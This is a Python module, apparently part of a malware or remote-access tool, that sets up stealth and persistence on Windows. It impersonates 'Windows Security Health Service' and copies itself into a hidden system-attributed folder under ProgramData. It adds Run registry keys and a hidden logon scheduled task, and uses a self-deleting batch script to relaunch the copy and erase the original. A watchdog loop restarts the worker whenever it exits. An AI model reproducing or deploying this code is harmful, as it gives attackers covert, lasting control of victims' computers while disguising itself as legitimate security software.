"""Stealth, persistence, and watchdog functionality"""
import os
import sys
import time
import logging
import subprocess

try:
    from config import STEALTH_CONFIG
except ImportError:
    STEALTH_CONFIG = {
        'process': 'WindowsSecurityHealthService.exe',
        'folder': 'Microsoft\\Windows\\Security\\HealthCheck',
        'service': 'Windows Security Health Service',
        'registry_key': 'SecurityHealthService'
    }


def check_if_running_stealth():
    """Check if running from stealth location."""
    current_path = sys.executable if getattr(sys, 'frozen', False) else __file__
    return STEALTH_CONFIG['folder'] in current_path


def setup_persistence(hidden_exe):
    """Set up persistence via Registry and Scheduled Task."""
    try:
        import winreg
        registry_locations = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"),
        ]
        for hive, key_path in registry_locations:
            try:
                key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, STEALTH_CONFIG['registry_key'], 0, winreg.REG_SZ, f'"{hidden_exe}"')
                winreg.CloseKey(key)
            except Exception:
                pass
    except ImportError:
        pass
    
    task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions>
    <Exec><Command>{hidden_exe}</Command></Exec>
  </Actions>
</Task>"""
    
    system_drive = os.environ.get('SystemDrive', 'C:') + '\\'
    hidden_folder = os.path.join(system_drive, 'ProgramData', STEALTH_CONFIG['folder'])
    task_xml_path = os.path.join(hidden_folder, 'task.xml')
    
    try:
        with open(task_xml_path, 'w', encoding='utf-16') as f:
            f.write(task_xml)
        subprocess.run(
            ['schtasks', '/Create', '/TN', STEALTH_CONFIG['service'], '/XML', task_xml_path, '/F'],
            capture_output=True, shell=True
        )
        os.remove(task_xml_path)
    except Exception:
        pass


def install_stealth():
    """Install to hidden location with persistence."""
    if check_if_running_stealth():
        source_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        setup_persistence(source_path)
        return True
    
    source_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    system_drive = os.environ.get('SystemDrive', 'C:') + '\\'
    hidden_folder = os.path.join(system_drive, 'ProgramData', STEALTH_CONFIG['folder'])
    hidden_exe = os.path.join(hidden_folder, STEALTH_CONFIG['process'])
    
    install_script = f"""@echo off
timeout /t 2 /nobreak >nul
taskkill /F /PID {os.getpid()}
if not exist "{hidden_folder}" mkdir "{hidden_folder}"
copy /Y "{source_path}" "{hidden_exe}"
attrib +H +S "{hidden_folder}"
attrib +H +S "{hidden_exe}"
start "" "{hidden_exe}"
:DEL_LOOP
del /f /q "{source_path}"
if exist "{source_path}" (
    timeout /t 1 /nobreak >nul
    goto DEL_LOOP
)
del /f /q "%~f0"
"""
    
    try:
        script_path = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'install_update.bat')
        with open(script_path, 'w') as f:
            f.write(install_script)
        logging.info(f"Starting background installation script: {script_path}")
        subprocess.Popen(
            script_path, shell=True,
            creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
        )
        sys.exit(0)
    except Exception as e:
        logging.error(f"Stealth installation failed: {e}")
        return False


def run_watchdog():
    """Run as watchdog, restarting worker if it crashes."""
    if len(sys.argv) > 1 and sys.argv[1] == '--worker':
        return False
    
    logging.info("Watchdog started")
    while True:
        try:
            if getattr(sys, 'frozen', False):
                executable = sys.executable
                args = [executable, '--worker']
            else:
                executable = sys.executable
                args = [executable, __file__, '--worker']
            
            worker = subprocess.Popen(args)
            logging.info(f"Worker started with PID: {worker.pid}")
            worker.wait()
            logging.warning("Worker exited, restarting in 1 second...")
            time.sleep(1)
        except Exception as e:
            logging.error(f"Watchdog error: {e}")
            time.sleep(5)
    return True
